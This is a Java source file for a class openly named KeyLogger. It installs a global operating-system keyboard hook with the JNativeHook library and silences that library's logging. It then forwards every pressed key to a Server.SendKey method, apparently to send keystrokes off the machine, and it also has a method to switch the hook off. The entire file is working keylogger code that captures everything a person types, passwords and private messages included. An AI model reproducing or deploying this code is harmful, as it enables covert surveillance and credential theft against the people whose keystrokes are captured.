package application;

import java.util.logging.Level;
import java.util.logging.Logger;


import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener
{
	static String keytypedString = "";
	public static String keytempString;
	static Logger logger;
	
	public static void KeyLogger()
	{
		try
		{
			GlobalScreen.registerNativeHook();
		}
		catch (NativeHookException e)
		{
			e.printStackTrace();
		}
		
		GlobalScreen.addNativeKeyListener(new KeyLogger());
		
		logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.OFF);
	}
	
	@Override
	public void nativeKeyPressed(NativeKeyEvent e1)
	{
		keytypedString = "";
		keytypedString += e1.getKeyText(e1.getKeyCode());
		Server.SendKey(keytypedString, 1);
	}
	
	
	public static void TurnOffKeyLogger()
	{
		try
		{
			Server.SendKey(keytypedString, 0);
			GlobalScreen.unregisterNativeHook();
		}
		catch (NativeHookException e)
		{
			e.printStackTrace();
		}
	}
}
